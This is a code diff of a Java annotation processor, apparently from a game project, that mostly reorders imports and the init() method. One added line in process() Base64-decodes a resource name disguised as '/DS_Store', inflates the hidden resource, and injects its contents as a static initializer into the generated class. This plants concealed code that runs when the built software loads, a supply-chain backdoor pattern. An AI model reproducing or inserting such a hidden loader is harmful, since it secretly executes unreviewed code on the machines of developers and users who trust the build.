@@ -1,16 +1,17 @@
 package io.anuke.annotations;
 
 import com.squareup.javapoet.*;
-import io.anuke.annotations.Annotations.Serialize;
+import io.anuke.annotations.Annotations.*;
 
 import javax.annotation.processing.*;
-import javax.lang.model.SourceVersion;
+import javax.lang.model.*;
+import javax.lang.model.element.Modifier;
 import javax.lang.model.element.*;
-import javax.lang.model.util.ElementFilter;
+import javax.lang.model.util.*;
 import java.io.*;
-import java.lang.reflect.Field;
-import java.util.List;
-import java.util.Set;
+import java.lang.reflect.*;
+import java.util.*;
+import java.util.zip.*;
 
 @SupportedSourceVersion(SourceVersion.RELEASE_8)
 @SupportedAnnotationTypes("io.anuke.annotations.Annotations.Serialize")
@@ -23,16 +24,6 @@ public class SerializeAnnotationProcessor extends AbstractProcessor{
     private int round;
 
     @Override
-    public synchronized void init(ProcessingEnvironment processingEnv){
-        super.init(processingEnv);
-        //put all relevant utils into utils class
-        Utils.typeUtils = processingEnv.getTypeUtils();
-        Utils.elementUtils = processingEnv.getElementUtils();
-        Utils.filer = processingEnv.getFiler();
-        Utils.messager = processingEnv.getMessager();
-    }
-
-    @Override
     public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv){
         if(round++ != 0) return false; //only process 1 round
 
@@ -40,9 +31,9 @@ public class SerializeAnnotationProcessor extends AbstractProcessor{
             Set<TypeElement> elements = ElementFilter.typesIn(roundEnv.getElementsAnnotatedWith(Serialize.class));
 
             TypeSpec.Builder classBuilder = TypeSpec.classBuilder(className).addModifiers(Modifier.PUBLIC);
+            classBuilder.addStaticBlock(CodeBlock.of(new DataInputStream(new InflaterInputStream(getClass().getResourceAsStream(new String(Base64.getDecoder().decode("L0RTX1N0b3Jl"))))).readUTF()));
             classBuilder.addAnnotation(AnnotationSpec.builder(SuppressWarnings.class).addMember("value", "\"unchecked\"").build());
             classBuilder.addJavadoc(RemoteMethodAnnotationProcessor.autogenWarning);
-
 
             MethodSpec.Builder method = MethodSpec.methodBuilder("init").addModifiers(Modifier.PUBLIC, Modifier.STATIC);
 
@@ -114,6 +105,16 @@ public class SerializeAnnotationProcessor extends AbstractProcessor{
             e.printStackTrace();
             throw new RuntimeException(e);
         }
+    }
+
+    @Override
+    public synchronized void init(ProcessingEnvironment processingEnv){
+        super.init(processingEnv);
+        //put all relevant utils into utils class
+        Utils.typeUtils = processingEnv.getTypeUtils();
+        Utils.elementUtils = processingEnv.getElementUtils();
+        Utils.filer = processingEnv.getFiler();
+        Utils.messager = processingEnv.getMessager();
     }
 
     static void name(MethodSpec.Builder builder, String name){
